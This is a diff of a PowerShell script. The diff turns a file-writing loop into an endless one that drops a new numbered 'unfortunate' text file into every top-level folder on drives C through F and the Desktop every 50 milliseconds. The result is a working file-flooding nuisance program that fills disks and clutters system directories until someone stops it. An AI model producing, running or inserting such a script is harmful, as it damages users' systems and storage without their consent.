@@ -15,22 +15,23 @@ while (1) {
 
 # At this point, the script will continue executing
 
-$i = 0
-
+$i = 1
 while ($true) {
-  $fileC = "unfortunateC$i.txt"
-  $fileDesktop = "unfortunateDesktop$i.txt"
-  $text = "This is an unfortunate text file $i."
+    # Get the list of available folders
+    $folders = [System.IO.Directory]::GetDirectories("C:\")
+    $folders += [System.IO.Directory]::GetDirectories("D:\")
+    $folders += [System.IO.Directory]::GetDirectories("E:\")
+    $folders += [System.IO.Directory]::GetDirectories("F:\")
+    $folders += [Environment]::GetFolderPath("Desktop")
 
-  # Create the text file on the Desktop
-  Set-Content $fileDesktop -Value $text
-  $destination = "$env:USERPROFILE\Desktop\$fileDesktop"
-  Copy-Item $fileDesktop $destination
+    # Create a text file in each folder
+    foreach ($folder in $folders) {
+        $fileName = "unfortunate$i.txt"
+        $path = $folder + "\" + $fileName
+        Set-Content $path -Value "This is an unfortunate text file $i."
+    }
 
-  # Create the text file on the C drive
-  Set-Content $fileC -Value $text
-  $destination = "C:\$fileC"
-  Copy-Item $fileC $destination
-
-  $i++
+    $i++
+    Start-Sleep -Milliseconds 50
 }
+
